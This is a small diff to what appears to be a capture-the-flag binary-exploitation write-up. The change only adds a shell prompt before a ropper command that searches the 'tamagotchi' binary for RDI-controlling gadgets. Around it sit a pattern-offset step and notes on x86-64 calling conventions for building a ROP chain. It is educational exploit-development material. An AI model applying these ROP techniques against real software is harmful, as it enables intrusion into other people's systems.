@@ -96,7 +96,7 @@ gdb-peda$ pattern_offset 0x4325416e
 In 64-bit binaries, function parameters are passed in registers. The first six parameters are passed in registers RDI, RSI, RDX, RCX, R8, and R9. So I employed [`ropper`](https://github.com/sashs/ropper) to find a suitable ROP injection point.
 
 ```bash
-ropper --file tamagotchi --search "% ?di"
+$ ropper --file tamagotchi --search "% ?di"
 0x0000000000400695: call 0x4b0; mov edi, 0x4008b7; call 0x4b0; pop rbp; ret;
 0x00000000004006b9: call 0x4b0; mov edi, 0x400a5b; call 0x4b0; pop rbp; ret;
 0x000000000040069a: mov edi, 0x4008b7; call 0x4b0; pop rbp; ret;
